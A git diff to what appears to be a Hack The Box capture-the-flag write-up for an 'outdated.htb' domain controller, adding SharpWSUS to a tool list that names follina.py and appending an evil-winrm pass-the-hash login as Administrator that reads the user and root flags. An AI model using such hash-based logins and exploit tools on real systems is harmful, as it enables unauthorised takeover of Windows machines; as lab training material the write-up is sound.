@@ -1,4 +1,6 @@
-### Tools: smbclient, swaks, follina.py
+# IN PROGRESS
+
+### Tools: smbclient, swaks, follina.py, SharpWSUS
 
 ```console
 └──╼ [★]$ nmap -A -p- -T4 -Pn 10.129.56.38
@@ -229,3 +231,10 @@ dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
 
 *Evil-WinRM* PS C:\temp> 
 ```
+
+└──╼ [★]$ evil-winrm -i 10.129.56.140 -u Administrator -H 716f1ce2e2cf38ee1210cce35eb78cb6
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat /users/sflowers/Desktop/user.txt
+81113c27e9201255d99fa5f9b0e22ec0
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+8822592490012737f4ee44955d0be33d
